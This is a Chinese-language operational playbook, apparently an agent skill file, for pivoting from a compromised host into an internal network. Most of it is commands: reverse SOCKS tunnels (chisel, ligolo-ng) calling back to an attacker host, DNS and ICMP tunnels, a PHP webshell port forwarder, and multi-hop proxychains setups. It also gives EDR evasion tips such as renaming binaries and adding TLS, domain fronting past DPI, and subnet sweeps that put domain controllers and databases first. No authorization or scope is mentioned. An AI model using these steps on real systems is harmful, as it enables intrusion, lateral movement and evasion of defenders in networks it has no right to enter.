---
name: proxy-tunnel-pivot
description: 拿到一台机器之后，怎么用它进入内网。含出网判断、三层代理链搭建、常见工具选型与坑（glibc 不匹配、DNS 隧道、端口转发）。
---

# 隧道与代理：用一台机器进内网

拿到 shell 的机器叫"跳板"。目标是把流量从你的机器送进内网。

关键判断只有一个：**这台跳板能不能出网**。

---

## 一、先判出网能力

```bash
# 三种出网方式，逐个测
curl -s -m 5 https://1.1.1.1 -o /dev/null -w "%{http_code}\n"     # TCP 443
curl -s -m 5 http://1.1.1.1 -o /dev/null -w "%{http_code}\n"       # TCP 80
nslookup test.oast.pro 2>/dev/null                                  # DNS
```

| 结果 | 类型 | 可用方案 |
| :--- | :--- | :--- |
| 443/80 通 | 正向出网 | 反向隧道（chisel / frp / nps） |
| 只有 DNS 通 | DNS 出网 | DNS 隧道（dnscat2 / iodine） |
| 都不通 | 完全隔离 | 端口转发 + 内网横向，或 ICMP 隧道 |
| 出网但被 DPI 拦 | 半出网 | 伪装成正常流量（域前置 / CDN 中转） |

**注意**：`curl` 不通不代表没网。可能只是没有 `curl`，或者走了代理。用 `nc -zv 1.1.1.1 443` 或 `/dev/tcp` 再测。

```bash
# 没有 nc 时用 bash 内建
timeout 3 bash -c "echo > /dev/tcp/1.1.1.1/443" && echo "443 通"
```

---

## 二、正向出网：反向隧道

跳板能出网时，让它主动连你的服务器，流量走这条连接。

### 方案选型

| 工具 | 适用 | 优点 | 缺点 |
| :--- | :--- | :--- | :--- |
| **chisel** | 通用，HTTP 隧道 | 单文件、静态编译、支持 socks5 | 流量特征明显 |
| **frp** | 长期稳定 | 功能全、配置清晰 | 需要配置文件 |
| **nps** | 多客户端管理 | 带 Web 面板 | 体积大 |
| **ligolo-ng** | 内网横向 | 不需要 socks，直接路由 | 需要 TUN 设备 |
| **ssh -R** | 有 ssh 客户端 | 零依赖 | 需要目标有 ssh |

### chisel（最常用）

```bash
# 服务端（你的 VPS）
./chisel server -p 8080 --reverse --socks5

# 目标（跳板）
./chisel client YOUR_IP:8080 R:socks

# 本地用 socks5 127.0.0.1:1080
```

**坑 1：glibc 版本**
静态编译版没有这个问题。用 `chisel_*_linux_amd64` 而不是 `_glibc` 版本。

**坑 2：架构判断错误**
```bash
uname -m    # x86_64 / aarch64 / armv7l / mips
```
ARM 设备很多，别默认传 amd64。

**坑 3：被杀软/EDR 拦**
改文件名（`chisel` → `svc_update`）、换端口（8080 → 443）、加 TLS。

### ligolo-ng（内网横向首选）

```bash
# 服务端
./proxy -selfcert -laddr 0.0.0.0:11601

# 目标
./agent -connect YOUR_IP:11601 -ignore-cert

# 服务端里
session          # 选会话
ifconfig         # 看目标的内网网卡
interface_create --name ligolo
route_add --name ligolo --route 10.10.10.0/24
```

**优势**：不需要 socks 代理，直接路由。扫内网时速度快得多。

**坑**：需要本地有 TUN 设备（Windows 要装 TAP 驱动）。

---

## 三、不出网：端口转发

跳板完全不出网，但你能访问它（通过 webshell 或已有的 shell）。

### 用现成工具

```bash
# 目标上起一个转发（把内网 3306 转到目标的 8080）
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:3306

# 或者用 ssh（如果目标有 ssh 客户端）
ssh -L 0.0.0.0:8080:10.0.0.5:3306 user@localhost
```

### 没有工具时：webshell 做转发

写一个 PHP 转发脚本（性能差，但能用）：

```php
<?php
$target = $_GET['t'];   // 10.0.0.5:3306
$data = file_get_contents('php://input');
$fp = fsockopen(...explode(':', $target), $errno, $errstr, 5);
if ($fp) { fwrite($fp, $data); echo stream_get_contents($fp); fclose($fp); }
```

### 用 ICMP 隧道（极端情况）

`ptunnel` / `icmpsh` —— 只在 TCP/UDP 全封、ICMP 放行时用。

**注意**：很多环境 ICMP 也被限速，实际速率可能只有几 KB/s。

---

## 四、DNS 隧道

只有 DNS 出网时用。

```bash
# 服务端（需要自己的域名 + NS 记录指向 VPS）
./dnscat2-server your.domain.com

# 目标
./dnscat2 your.domain.com
```

**前提**：你得有一个域名，且能配置 NS 记录。用公共 DNS 服务（比如 `*.oast.pro`）只能收数据，不能双向通信。

**速率**：通常 5-50 KB/s。适合传命令和小文件，不适合传大文件。

**坑**：很多内网 DNS 只允许解析特定域，或者有 DNS 防火墙（只放行已知域名）。测试时先 `nslookup random.your.domain` 看是否返回。

---

## 五、三层代理链

进入内网后，经常需要多层跳转：

```
你的机器 → 跳板1（DMZ） → 跳板2（内网） → 目标（核心区）
```

### 做法

```bash
# 跳板1 上起 chisel，连回你
./chisel client YOUR_IP:8080 R:socks

# 通过跳板1 的 socks，把跳板2 的 chisel 传上去并执行
proxychains4 scp chisel user@10.0.0.5:/tmp/
proxychains4 ssh user@10.0.0.5 "/tmp/chisel client YOUR_IP:8081 R:socks"

# 本地开两个 socks 端口，用 proxychains 串起来
```

**更简单的做法**：用 `ligolo-ng`，每个 agent 加一条路由，不需要串 socks。

### proxychains 配置

```ini
# /etc/proxychains4.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

**坑**：`proxychains` 只代理 TCP，不代理 UDP 和 ICMP。扫内网时 `nmap -sU` 和 `ping` 都不走代理。

**nmap 走代理的正确姿势**：

```bash
# TCP connect 扫描（走代理）
proxychains4 nmap -sT -Pn -p 22,80,443 10.0.0.0/24

# 不要用 -sS（SYN 扫描需要 raw socket，不走代理）
```

---

## 六、内网探测

进去之后第一件事：摸清拓扑。

```bash
# 1. 本机网卡和路由
ip a; ip route

# 2. ARP 表（已经通信过的主机）
arp -a

# 3. 邻居发现
ip neigh

# 4. 快速存活扫描（不用 nmap）
for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i >/dev/null 2>&1 && echo "10.0.0.$i up") & done; wait

# 5. 常见端口
for p in 22 80 443 445 3306 6379 8080 9200; do
  timeout 1 bash -c "echo > /dev/tcp/10.0.0.5/$p" 2>/dev/null && echo "$p open"
done
```

**优先级**：域控（389/636/88）> 数据库（3306/1433/5432/6379）> 运维跳板（22/3389）> 应用服务器。

---

## 七、常见坑

| 坑 | 表现 | 处理 |
| :--- | :--- | :--- |
| glibc 不匹配 | `./chisel: /lib64/libc.so.6: version GLIBC_2.28 not found` | 用静态编译版 |
| 架构错 | `cannot execute binary file` | `uname -m` 确认 |
| 上传被截断 | 文件大小对不上 | 分块上传 + 校验 sha256 |
| socks 不通 UDP | DNS 查询失败 | 用 TCP DNS，或本地 hosts |
| 代理链断在中间 | 时通时不通 | 每层单独测，别一次串完 |
| 端口被占 | `bind: address already in use` | 换端口 |
| 防火墙只放行特定端口 | 只有 80/443 通 | 隧道走 80/443 |
| 出网被 DPI 识别 | 连上就断 | 加 TLS + 域名前置 |

---

## 八、检查清单

```
[ ] 跳板 IP / 权限：        ______
[ ] 出网能力：              443/80 / 仅 DNS / 无
[ ] 架构：                  x86_64 / aarch64 / armv7l / mips
[ ] glibc 版本：            ______
[ ] 隧道方案：              chisel / frp / ligolo / ssh -R / DNS
[ ] 本地 socks 端口：       ______
[ ] 内网网段：              ______
[ ] 已发现主机数：          ______
[ ] 高价值目标：            域控 / 数据库 / 运维机
[ ] 需要几层跳板：          ______
```
